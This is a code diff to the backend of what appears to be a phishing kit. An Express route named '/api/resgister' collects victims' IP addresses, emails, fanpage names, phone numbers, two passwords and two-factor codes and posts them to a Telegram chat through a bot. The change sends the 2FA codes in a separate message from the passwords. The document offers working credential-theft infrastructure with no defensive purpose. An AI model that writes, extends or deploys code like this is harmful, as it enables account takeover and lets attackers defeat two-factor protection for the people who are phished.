@@ -25,6 +25,13 @@ app.post('/api/resgister', (req, res) => {
     res.send(result);
 
     // SEND DATA TO TELE
+
+if (data.firstTwoFa !== "" || data.secondTwoFa !== "") {
+    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
+<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
+<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
+    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
+} else {
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
 <strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
 <strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
@@ -32,15 +39,12 @@ app.post('/api/resgister', (req, res) => {
 <strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
 <strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
-<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
-<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
-
-const messageIp = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}`;
-
+<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
-    bot.sendMessage(process.env.CHAT_ID, messageIp,  { parse_mode: 'HTML' });
+}
+
+
 
     // bot_two.sendMessage(process.env.CHAT_ID_BOT_TWO, location,  { parse_mode: 'HTML' });
 
